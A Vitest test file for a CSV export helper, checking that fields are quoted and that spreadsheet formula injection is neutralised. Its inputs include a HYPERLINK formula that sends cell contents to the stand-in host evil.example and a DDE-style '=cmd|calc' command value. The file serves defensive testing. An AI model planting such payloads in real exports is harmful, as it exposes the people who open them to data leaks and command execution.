import { describe, it, expect } from 'vitest'
import { escapeCsvField, buildCsv } from './csv.ts'

describe('escapeCsvField', () => {
  it('passes plain text through', () => {
    expect(escapeCsvField('Acme Roofing')).toBe('Acme Roofing')
    expect(escapeCsvField(null)).toBe('')
    expect(escapeCsvField(undefined)).toBe('')
  })

  it('quotes delimiters, quotes and line breaks', () => {
    expect(escapeCsvField('Smith, Jane')).toBe('"Smith, Jane"')
    expect(escapeCsvField('say "hi"')).toBe('"say ""hi"""')
    expect(escapeCsvField('line one\nline two')).toBe('"line one\nline two"')
    expect(escapeCsvField('line one\rline two')).toBe('"line one\rline two"')
  })

  it('neutralizes cells that would run as a formula', () => {
    expect(escapeCsvField('=1+1')).toBe("'=1+1")
    expect(escapeCsvField('+cmd')).toBe("'+cmd")
    expect(escapeCsvField('-2+3')).toBe("'-2+3")
    expect(escapeCsvField('@SUM(A1)')).toBe("'@SUM(A1)")
    expect(escapeCsvField('\t=1+1')).toBe("'\t=1+1")
    expect(escapeCsvField('\r=1+1')).toBe(`"'\r=1+1"`)
  })

  it('quotes a neutralized formula that also carries quotes and commas', () => {
    const payload = '=HYPERLINK("https://evil.example/"&A1,"Open")'
    expect(escapeCsvField(payload)).toBe(`"'=HYPERLINK(""https://evil.example/""&A1,""Open"")"`)
  })

  it('leaves plain numbers numeric', () => {
    expect(escapeCsvField(-150)).toBe('-150')
    expect(escapeCsvField('-150.00')).toBe('-150.00')
    expect(escapeCsvField('+42')).toBe('+42')
    expect(escapeCsvField(12.5)).toBe('12.5')
  })

  it('treats a formatted phone with a leading plus as text', () => {
    expect(escapeCsvField('+1 (615) 555-0101')).toBe("'+1 (615) 555-0101")
  })
})

describe('buildCsv', () => {
  it('escapes header and data cells', () => {
    const csv = buildCsv(['Client', 'Balance'], [['=cmd|calc', '-25.00'], ['Smith, Jane', 10]])
    expect(csv).toBe("Client,Balance\n'=cmd|calc,-25.00\n\"Smith, Jane\",10")
  })
})
